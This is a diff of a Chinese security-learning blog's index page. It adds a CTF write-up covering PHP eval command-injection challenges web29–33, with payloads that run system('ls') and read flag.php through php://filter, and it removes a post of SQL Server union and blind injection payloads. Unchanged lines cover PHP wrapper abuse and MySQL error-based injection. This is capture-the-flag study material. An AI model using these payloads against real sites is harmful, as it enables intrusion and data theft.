@@ -149,7 +149,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-count">13</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -185,6 +185,87 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/04/web%E5%85%A5%E9%97%A829-33/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/apple-touch-icon-next.png">
+      <meta itemprop="name" content="清者">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="The future is promising">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | The future is promising">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/02/04/web%E5%85%A5%E9%97%A829-33/" class="post-title-link" itemprop="url">web入门29-33</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-02-04 18:20:06 / 修改时间：19:46:00" itemprop="dateCreated datePublished" datetime="2023-02-04T18:20:06+08:00">2023-02-04</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p>eval函数<br>code<br>需要被执行的字符串<br>代码不能包含打开/关闭PHP tags。比如，echo”Hi!”；’不能这样传入：‘<?php echo"Hi!"；？>'。但仍然可以从合适的 PHP tag来离开、重新进入PHP模式。比如'echo "In PHP mode";?>In HTML mode!<?php echo "Back in PHP mode";'
+除此之外，传入的必须是有效的PHP代码。所有的语句必须以分号结尾。比如‘echo"Hi!"’会导致一个 parse error，而‘echo "Hi!"；’则会正常运行。
+return语句会立即中止当前字符串的执行。
+代码执行的作用域是调用eval()处的作用域。因此，eval()里任何的变量定义、修改，都会在函数结束后被保留。
+了解 eval函数之后
+我们传入?c=echo "Y2my";?>ctf <?php system('ls');得到flag的位置
+由于是 php，直接 cat flag.php 会被解析所以 改为 include 包含一下，在编码传入
+?c=echo "Y2my"; ?>ctf &lt;?php include($_GET[‘cmd’]);&amp;cmd=php://filter/read=convert.base64-encode/resource=flag.php<br>这里用到了php://filter伪协议<br>pregmatch函数<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42318977/article/details/115485317">https://blog.csdn.net/qq_42318977/article/details/115485317</a></p>
+<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p>相比 Web29 增加了过滤规则<br>传入?c=echo “Y2my “; echo <code>ls</code>; ?&gt;得到flag的位置<br>然后?c=echo “Y2my “; include($_GET[‘url’]); ?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php<br>得到的编码解码得到flag</p>
+<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p>又增加了一些过滤<br>先传入?c=$y2my=1;echo/**/<code>ls</code>;?&gt;得到flag的位置<br>由于增加 ’ 单引号的过滤，单引号改为双引号就行了<br>传入?c=$y2my=1;include($_GET[“url”]);?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php<br>或是?c=include($_GET[“url”]);?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php<br>得到的结果解码得到flag</p>
+<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p>这里又把‘（’给过滤掉了<br>然而在include中可以没有括号<br>因此步骤和31一样，只需要去掉括号就行了<br>?c=$y2my=include$_GET[“url”]?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php<br>后面基本不变到36多了个过滤数字，之需将数字变化为字母即可</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -242,7 +323,7 @@
 <h2 id="php-input伪协议"><a href="#php-input伪协议" class="headerlink" title="php://input伪协议"></a>php://input伪协议</h2><p>(1)php://input是个可以访问请求的原始数据的只读流。<br>(2) 利用条件<br>allow_url_fopen 不做要求，allow_url_include=On<br>(3)利用姿势：<br>POST以下数据：‘);?&gt;<br>封装协议摘要(针对 php://filter，参考被筛选的封装器。)<br>受限于 allow_url_fopen No<br>受限于 allow_url_include 仅php://input、 php://stdin、php://memory和php://temp。</p>
 <h2 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h2><p>(1)data:// 一 数据<br>(2)使用版本：PHP 5.2.0起 data：数据流封装器开始有效。<br>(3)用法：<br>data://text/plain,<br>data://text/plain;base64, PD9waHAgcGhwaW5mbygpOyA/Pg==<br>封装协议摘要<br>受限于allow_url_fopen No<br>受限于allow_url_include Yes<br>允许读取 Yes<br>允许写入 No</p>
 <h2 id="http-伪协议"><a href="#http-伪协议" class="headerlink" title="http://伪协议"></a>http://伪协议</h2><p>(1)<a target="_blank" rel="noopener" href="http://--https//-%E8%AE%BF%E9%97%AEHTTP(s)%E7%BD%91%E5%9D%80">http://--https://-访问HTTP(s)网址</a><br>(2)允许通过HTTP1.0的GET方法，以只读访问文件或资源。<br>(3)HTTP请求会附带一个 Host:头，用于兼容基于域名的虚拟主机。如果在你的php.ini文件中或字节流上下文(context)配置了user_agent字符串，它也会被包含在请求之中。<br>封装协议概要<br>受allow_url_fopen 限制 Yes<br>允许读取 Yes<br>允许写入 No<br>允许添加 No<br>用法<br><a href="http://example.com/">http://example.com</a><br><a href="http://example.com/file.php?varl=vall&amp;var2=val2">http://example.com/file.php?varl=vall&amp;var2=val2</a><br><a href="http://user:password@example.com/">http://user:password@example.com</a><br><a href="https://example.com/">https://example.com</a><br><a href="https://example.com/file.php?varl=vall&amp;var2=val2">https://example.com/file.php?varl=vall&amp;var2=val2</a><br><a href="https://user:password@example.com/">https://user:password@example.com</a></p>
-<h2 id="ftp-伪协议"><a href="#ftp-伪协议" class="headerlink" title="ftp://伪协议"></a>ftp://伪协议</h2><p>(1)<a href="ftp://--ftps//">ftp://--ftps://</a> - 访问 FTP(s) URLs<br>(2)允许通过FTP读取存在的文件，以及创建新文件。<br>(3)如果服务器不支持被动(passive)模式的FTP，连接会失败。<br>(4)打开文件后你既可以读也可以写，但是不能同时进行。<br>(5)版本：php4.3以上<br>(6)PHP 5.0.0起文件可以通过<a href="ftp://url封装器来追加(append).在之前的版本,尝试通过ftp//%E6%9D%A5%E8%BF%BD%E5%8A%A0%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E5%B0%86%E4%BC%9A%E5%AF%BC%E8%87%B4%E9%94%99%E8%AF%AF%E3%80%82">ftp://URL封装器来追加(append)。在之前的版本，尝试通过ftp://来追加一个文件将会导致错误。</a><br>用法<br>(1)&gt;<a href="ftp://example.com/pub/file.txt">ftp://example.com/pub/file.txt</a><br>(2)<a href="ftp://user:password@example.com/pub/file.txt">ftp://user:password@example.com/pub/file.txt</a><br>(3)ftps://example.com/pub/file.txt<br>(4)ftps://user:<a href="mailto:&#112;&#x61;&#115;&#x73;&#x77;&#x6f;&#114;&#x64;&#x40;&#101;&#120;&#97;&#x6d;&#112;&#x6c;&#x65;&#46;&#99;&#111;&#x6d;">&#112;&#x61;&#115;&#x73;&#x77;&#x6f;&#114;&#x64;&#x40;&#101;&#120;&#97;&#x6d;&#112;&#x6c;&#x65;&#46;&#99;&#111;&#x6d;</a>/pub/file.txt<br>封装协议概要<br>属性 PHP 4 PHP 5<br>受allow_url_fopen影响 Yes Yes<br>允许读取 Yes Yes<br>允许写入 Yes (仅支持新文件) Yes(新文件/启用overwrite 后已存在的文件)<br>允许添加 No Yes</p>
+<h2 id="ftp-伪协议"><a href="#ftp-伪协议" class="headerlink" title="ftp://伪协议"></a>ftp://伪协议</h2><p>(1)<a href="ftp://--ftps//">ftp://--ftps://</a> - 访问 FTP(s) URLs<br>(2)允许通过FTP读取存在的文件，以及创建新文件。<br>(3)如果服务器不支持被动(passive)模式的FTP，连接会失败。<br>(4)打开文件后你既可以读也可以写，但是不能同时进行。<br>(5)版本：php4.3以上<br>(6)PHP 5.0.0起文件可以通过<a href="ftp://url封装器来追加(append).在之前的版本,尝试通过ftp//%E6%9D%A5%E8%BF%BD%E5%8A%A0%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E5%B0%86%E4%BC%9A%E5%AF%BC%E8%87%B4%E9%94%99%E8%AF%AF%E3%80%82">ftp://URL封装器来追加(append)。在之前的版本，尝试通过ftp://来追加一个文件将会导致错误。</a><br>用法<br>(1)&gt;<a href="ftp://example.com/pub/file.txt">ftp://example.com/pub/file.txt</a><br>(2)<a href="ftp://user:password@example.com/pub/file.txt">ftp://user:password@example.com/pub/file.txt</a><br>(3)ftps://example.com/pub/file.txt<br>(4)ftps://user:<a href="mailto:&#112;&#x61;&#x73;&#115;&#x77;&#x6f;&#x72;&#100;&#x40;&#x65;&#120;&#x61;&#109;&#112;&#108;&#x65;&#46;&#x63;&#x6f;&#109;">&#112;&#x61;&#x73;&#115;&#x77;&#x6f;&#x72;&#100;&#x40;&#x65;&#120;&#x61;&#109;&#112;&#108;&#x65;&#46;&#x63;&#x6f;&#109;</a>/pub/file.txt<br>封装协议概要<br>属性 PHP 4 PHP 5<br>受allow_url_fopen影响 Yes Yes<br>允许读取 Yes Yes<br>允许写入 Yes (仅支持新文件) Yes(新文件/启用overwrite 后已存在的文件)<br>允许添加 No Yes</p>
 <h2 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h2><p>phar介绍<br>(1)phar协议的作用是归档，自PHP5.3.0起开始有效<br>(2)Phar归档文件最有特色的特点是可以方便地将多个文件分组为一个文件。这样，phar归档文件提供了一种将完整的PHP应用程序分发到单个文件中并从该文件运行它的方法，而无需将其提取到磁盘中。<br>(3)phar 可以处理 tar、zip和phar文件<br>封装协议摘要<br>支持allow_url_fopen No<br>支持allow_url_include No<br>允许读取 Yes<br>允许写入 Yes</p>
 <h2 id="phar伪协议的利用方式"><a href="#phar伪协议的利用方式" class="headerlink" title="phar伪协议的利用方式"></a>phar伪协议的利用方式</h2><p>phar://phpinfo.zip/phpinfo.txt<br>注意事项：<br>(1)压缩包中文件的名字要和后面的一样<br>(2)压缩包在压缩后还可以改后缀名<br>其他归档压缩类扩展<br>Bzip2、zip、LZF等<br>zlib://– bzip2://-vzip://—压缩流<br>compress.zlib://file.gz<br>compress.bzip2://file.bz2<br>zip://archive.zip#dir/file.txt</p>
 <h2 id="zip-伪协议"><a href="#zip-伪协议" class="headerlink" title="zip://伪协议"></a>zip://伪协议</h2><p>(1)使用条件：<br>PHP&gt; =5.3.0，注意在windows下测试php要5.3.0~5.4才可以。在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。<br>(2)利用方式：<br>zip://[压缩文件绝对路径]#[压缩文件内的子文件名]<br>zip://xxx.zip#shell.txt<br>zip://xxx.png#shell.php</p>
@@ -863,78 +944,6 @@
 <h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>id=1’ and  (select count(*),floor(rand(0)<em>2)as a from information_schema.tables group by a)– -<br>id=1’ and (select 1 from(select count(</em>),floor(rand(0)*2)as a from information_schema.tables group by a))– -<br>其中floor(rand(0)<em>2)会生成一个011011的序列，而且每次运行的时候都不变<br>所以count(</em>),floor(rand(0)*2)as a from users group by a运行的时候，第一次拿到的group by后面的值是0，在虚拟表中不存在，所以要再运算一次来获取group by后面的值，这时候获取的值是1<br>所以group by要进行两次运算</p>
 <h2 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h2><p>extractvalue(XML_document,XPath_string)<br>第一个参数：XML_document是string格式，为XML文档对象的名称，表示传入的目标XML文档<br>第二个参数：XPath_string(Xpath格式的字符串)，表示xml路径<br>作用：从目标XML中返回包含所查询的字符串<br>例：id=1 and (extractvalue(1,concat((select database()))))<br>    id=1 and (extractvalue(1,concat(‘~’,(select database()))))<br>    id=1 and (extractvalue(1,concat(‘/‘,(select database()))))</p>
 <h2 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h2><p>updatexml(XML_document,XPath_string,new_value)<br>第一个参数：XML_document是string格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string(Xpath格式的字符串)<br>第三个参数：new_value,string格式，替换查找到的符合条件的数据<br>函数作用：改变文档中符合条件的节点的值</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/13/sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/apple-touch-icon-next.png">
-      <meta itemprop="name" content="清者">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="The future is promising">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | The future is promising">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/01/13/sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">sql 手工注入</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2023-01-13 15:38:34 / 修改时间：19:19:13" itemprop="dateCreated datePublished" datetime="2023-01-13T15:38:34+08:00">2023-01-13</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="server手工注入"><a href="#server手工注入" class="headerlink" title="server手工注入"></a>server手工注入</h2><h3 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h3><p>sa权限：数据库操作，文件管理，命令执行，注册表读取等，拥有最高权限<br>and 1=(is_srvrolemember(‘sysadmin’))  //返回正常为sa<br>db权限：文件管理，数据库操作等<br>and 1=(is_member(‘db_owner’))  //返回正常值为DB_OWNER<br>public权限：数据库操作<br>and 1=(is_srvrolemember(‘public’))  //public权限较低</p>
-<h3 id="一般步骤"><a href="#一般步骤" class="headerlink" title="一般步骤"></a>一般步骤</h3><p>name为所查东西的名称<br>判断注入点是否存在<br>sql i.aspx?id=1’  (报错)/‘-  -  (正常)/‘ and 1=1-  -  (正常)/‘ and 1&gt;1-  -  (空)<br>判断字段数<br>order by<br>联合查询获得系统信息<br>union select<br>获取当前数据库名<br>sql i.aspx?id=-1’ union select null,db_name(0),null–<br>?id=-1’ union select null,null,name from sys.databases where name != ‘master’ –<br>获取其他数据库名<br>sql i.aspx?id=-1’ union select null,db_name(1),null–<br>sql i.aspx?id=-1’ union select null,db_name(2),null–<br>?id=-1’ union select null,(select top 1 name from sys. databases where name not in (select top 0 name from sys. databases)),null–<br>?id=-1’ union select null,(select top 1 name from sys. databases where name not in (select top 1 name from sys. databases)),null–<br>获取当前数据表名<br>sql i.aspx?id=-1 union select top 1 NULL,name,NULL from test.sys.sysobjects where xtype=’U’–<br>获取其他数据表名<br>?id=-1’ union select top 1 NULL,name,NULL from test.sys.sysobjects where xtype=’U’ and name!=’users’–<br>?id=-1’ union select top 1 NULL,name,NULL from test.sys.sysobjects where xtype=’U’ and name!=’users’ and name !=’article’–<br>获取数据表中的一个字段名<br>?id=-1’ union select top 1 NULL,name,NULL from test.sys.syscolumns where id=OBJECT_ID(‘users’)–<br>获取其他字段名<br>?id=-1’ union select top 1 NULL,name,NULL from test.sys.syscolumns where id=OBJECT_ID(‘users’)</p>
-<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>判断是不是sql server数据库<br>?id=1 and exists(select * from sysobjects)<br>?id=1 and exists(select count(<em>) from sysobjects)<br>判断数据库版本信息<br>?id=1’ and substring((select @@version),22,4)=2008–<br>判断数据库用户<br>?id=1’ and 1=(is_srvrolemember(‘sysadmin’))–<br>判断数据库名称的长度<br>?id=1’ and len(db_name())=4 –<br>判断数据库名称<br>?id=1’ and ascii(substring(db_name(),1,1))&gt;97 –<br>?id=1’ and ascii(substring(db_name(),1,1))=116 –<br>?id=1’ and ascii(substring(db_name(),2,1))=101 –<br>判断数据表的数量<br>?id=1’ and (select count(</em>) from test..sysobjects where xtype=’U’)=3–<br>判断第一个数据表的名称的长度<br>?id=1’ and (select top 1 len(name) from test..sysobjects where xtype=’U’)=5–<br>判断第二个数据表的名称长度<br>?id=1’ and (select top 1 len(name) from test..sysobjects where xtype=’U’ and name!=’users’)=7–<br>判断数据表名称的第一个字符<br>?id=1’ and (select top 1 ascii(substring(name,1,1)) from test..sysobjects where xtype=’U’)=117–<br>判断数据表中列的数量<br>?id=1’ and (select top 1 count(*) from test..syscolumns where id=OBJECT_ID(‘users’))=3–<br>判断数据表中第一个字段的长度<br>?id=1’ and (select top 1 len(name) from test..syscolumns where id=OBJECT_ID(‘users’))=2–<br>判断数据表中第一个字段的名称<br>?id=1’ and (select top 1 ascii(substring(name,1,1)) from test..syscolumns where id=OBJECT_ID(‘users’))=105–<br>(判断第二个后面加上and name!=’id’)<br>此外还有时间盲注</p>
 
       
     </div>
